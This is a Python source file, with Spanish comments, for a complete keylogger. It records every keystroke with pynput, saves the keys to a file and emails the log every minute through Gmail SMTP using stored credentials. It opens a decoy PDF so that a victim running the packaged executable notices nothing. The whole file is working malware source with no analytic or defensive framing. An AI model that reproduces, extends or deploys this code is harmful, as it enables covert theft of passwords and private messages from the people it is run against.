import pynput.keyboard
import threading
import smtplib
import os
import subprocess
import sys
from email.mime.text import MIMEText
from dotenv import load_dotenv

load_dotenv()

class Keylogger:
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval
        self.email = os.getenv("EMAIL")
        self.password = os.getenv("PASSWORD")
        # Ajusta la ruta del archivo PDF
        if getattr(sys, 'frozen', False):  # Si el script se ejecuta desde el .exe
            self.pdf_path = os.path.join(sys._MEIPASS, 'Topicos_Software.pdf')
        else:
            self.pdf_path = 'Topicos_Software.pdf'
        self.log_file = "keylog.txt"

        # Asegúrate de que el archivo de registro esté vacío al inicio
        with open(self.log_file, "w") as f:
            f.write("")

    def append_to_log(self, string):
        self.log += string
        # También escribe en el archivo
        with open(self.log_file, "a") as f:
            f.write(string)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
            self.send_mail(self.email, self.password, self.log_file)
            # Limpia el archivo de registro después de enviar
            with open(self.log_file, "w") as f:
                f.write("")
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, log_file):
        with open(log_file, "r") as f:
            message = f.read()
        
        msg = MIMEText(message)
        msg["Subject"] = "Keylogger Report"
        msg["From"] = email
        msg["To"] = email

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)  # Usa la contraseña de aplicación aquí
            server.sendmail(email, email, msg.as_string())
            server.quit()
            print("Email sent successfully.")
        except Exception as e:
            print(f"Error sending email: {e}")

    def open_pdf(self):
        try:
            print(f"Attempting to open PDF at: {self.pdf_path}")  # Para depuración
            if os.name == 'posix':  # Para sistemas Unix-like (Linux, macOS)
                subprocess.run(['xdg-open', self.pdf_path], check=True)
            elif os.name == 'nt':  # Para Windows
                os.startfile(self.pdf_path)
            else:
                print("Unsupported OS.")
        except Exception as e:
            print(f"Error opening PDF: {e}")

    def start(self):
        # Abre el PDF al inicio
        self.open_pdf()
        
        # Inicia el escuchador del teclado y el reporte
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    time_interval = 60 
    keylogger = Keylogger(time_interval)
    keylogger.start()
